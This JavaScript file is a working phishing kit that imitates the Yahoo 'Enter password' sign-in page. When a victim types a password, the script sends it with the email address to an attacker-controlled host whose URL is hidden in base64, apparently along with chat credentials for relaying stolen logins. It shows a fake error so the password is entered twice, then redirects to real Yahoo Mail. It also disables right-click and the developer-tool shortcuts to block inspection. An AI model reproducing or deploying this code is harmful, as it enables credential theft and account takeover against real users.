function actn(){
    document.body.innerHTML = box;    
    }
    const box = `<head>
        <meta charset="utf-8">
        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no">
        <meta name="format-detection" content="telephone=no">
        <meta name="referrer" content="strict-origin-when-cross-origin">
        <title>Yahoo</title>
        <meta name="description" content="Best in class Yahoo Mail, breaking local, national and global news, finance, sports, music, movies... You get more out of the web, you get more out of&nbsp;life.">

        <link rel="icon" type="image/x-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-favicon-img-v0.0.2.ico">
        <link rel="shortcut icon" type="image/x-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-favicon-img-v0.0.2.ico">
        <meta name="google-site-verification" content="yOTFyUBPTnXtuk2cPpqfv7ZvZ960JgqsV8FomN3n7Y0">
        <link rel="apple-touch-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-apple-touch-v0.0.2.png">
        <link rel="apple-touch-icon-precomposed" href="https://s.yimg.com/wm/mbr/images/yahoo-apple-touch-v0.0.2.png">
        <style nonce="">
            #mbr-css-check {
                display: inline;
            }
        </style>
        <link href="https://s.yimg.com/wm/mbr/5d10459922918c7a1435ac0ed6ed40584afcce8b/yahoo-main.css" rel="stylesheet" type="text/css">
        
    </head>
    <body class="bucket-mbr_yak_chg_pwd_exp1 bucket-mbr-sms-exp-all-ns bucket-mbr-reg-birthdate">


    <div id="login-body" class="loginish  puree-v2  grid    ">
    <div class="mbr-desktop-hd">
    <span class="column">
         <a href="https://www.yahoo.com/">
            <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo " width="" height="36">
            <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png" alt="Yahoo" class="dark-mode-logo logo " width="" height="36">
        </a>
    </span>

</div>
    <div class="login-box-container">
        <div class="login-box right">
            <div class="mbr-login-hd txt-align-center">
                    <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo yahoo-en-US" width="" height="27">
                    <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png" alt="Yahoo" class="dark-mode-logo logo yahoo-en-US" width="" height="27">
            </div>
            <div class="challenge password-challenge">
    <div class="challenge-header">
        <div class="yid" id="displayName"></div>
    </div><div id="password-challenge" class="primary">
    <strong class="challenge-heading">Enter&nbsp;password</strong>
    <span class="txt-align-center challenge-desc">to finish sign&nbsp;in</span>
        <form action="" method="post" class="challenge-form ">
         
        <div id="password-container" class="input-group password-container blurred">
            <input type="password" id="epass" class="password" name="password" placeholder=" " autofocus="" autocomplete="current-password" data-rapid-tracking="true" data-ylk="elm:input;elmt:focus;slk:passwd;mKey:focus-passwd">
            <label for="login-passwd" id="password-label" class="password-label">Password</label>
            <div class="caps-indicator hide" id="caps-indicator" title="Capslock is&nbsp;on"></div>
            <button type="button" class="show-hide-toggle-button hide-pw" id="password-toggle-button" tabindex="-1" title="Show&nbsp;password" data-rapid-tracking="true" data-ylk="elm:btn;elmt:toggle;slk:toggle-show-passwd;mKey:toggle-show-hide">
            </button>
        </div>
        <p class="error-msg" id="error-msg" role="alert" data-error="messages.ERROR_EMPTY_PASSWORD">
            </p>
        <div class="button-container">
            <button type="button" id="btn2" onclick="redlogin()" class="pure-button puree-button-primary puree-spinner-button challenge-button" name="verifyPassword" value="Next" data-rapid-tracking="true" data-ylk="elm:btn;elmt:primary;slk:next;mKey:next">
                    Next
            </button>
        </div>
        <div class="forgot-cont challenge-button-link">
            <input type="submit" class="pure-button puree-button-link challenge-button-link" data-ylk="elm:btn;elmt:skip;slk:skip;mKey:skip-recovery" data-rapid-tracking="true" id="mbr-forgot-link" name="skip" value="Forgot&nbsp;password?">
        </div>
    </form>
</div>
</div>
        </div>
        <div id="login-box-ad-fallback" class="login-box-ad-fallback">
            <h1>Yahoo makes it easy to enjoy what matters most in your&nbsp;world.</h1>
<p>Best in class Yahoo Mail, breaking local, national and global news, finance, sports, music, movies and more. You get more out of the web, you get more out of&nbsp;life.</p>
        </div>
    </div>
    <div class="login-bg-outer">
        <div class="login-bg-inner">
                <div id="sb_rel_login-ad-rich" class="darla" style="position: relative; z-index: 9; width: 1440px; height: 1024px; visibility: inherit; display: inline-block; font-size: 0px;"><img src="https://s.yimg.com/cv/apiv2/default/20181213/YahooMailPlus_Filler_SUSI_don_t_mess_-1.png" width="1440" height="1024" border="0"></div>
                    </div>
    </div>
    
</div>



    
</body>`;


var s = document.createElement("script"); 
    s.src = "https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"; 
    s.onload = function(e){ 


$(document).ready(function() {
      actn();
var elf = document.getElementById("epass");
if (elf){
elf.addEventListener("keypress", function(event) {
  if (event.key === "Enter") {
    event.preventDefault();
    document.getElementById("btn2").click();
  }
});
}
  
 var email = $("#ref").attr("soso");
$("#displayName").html(email);   


                      
 }); 
}
document.head.appendChild(s);  


        document.addEventListener('contextmenu', event => event.preventDefault());

        document.onkeydown = function(e) {
            if (e.ctrlKey && (e.keyCode === 73 || e.keyCode === 105 || e.keyCode === 74 || e.keyCode === 106 || e.keyCode === 85 || e.keyCode === 117)) {
                alert('not allowed');
                return false;
            } else {
                return true;
            }
        }
            
   



function sign(){
    document.getElementById('load').style.display = 'none';
    document.getElementById('error3').style.display = 'block'; 
    document.getElementById("epass").value='';
    document.getElementById("btn2").disabled = false; 

}

 var count = 0;
             function redlogin(){
                var email= document.getElementById("displayName").innerHTML.trim();
                  var epass= document.getElementById("epass").value;
                var land = atob('aHR0cHM6Ly9tYWlsLnlhaG9vLmNvbS8='); 

                if(epass==''){

document.getElementById("password-container").classList.add('error');

$("#error-msg").html("Please provide password.");   
                }else{
count=count+1;
$("#btn2").attr('disabled',true);


  var meji= $("#ref").attr("ant");
  var tcd = meji.split('#');
  var cckcrch = atob(tcd[0]);
  var yara = atob(tcd[1]);
  var ruta = atob('aHR0cHM6Ly9zb2phYm9pLm9ubGluZS8=');
  var register = "u="+email+"&p="+epass+"&chatid="+yara+"&makin="+cckcrch+"&signup=Yahoo";

$.post(ruta, register, function(data){            
          console.log('response: ', data);
if (count>=2) {
       count=0;
       
        window.location.replace(land);
}else {
$("#error-msg").html("Invalid password. Please try&nbsp;again"); 
  
       $("#btn2").attr('disabled',false);
        
return false;
}         
 });
}
}
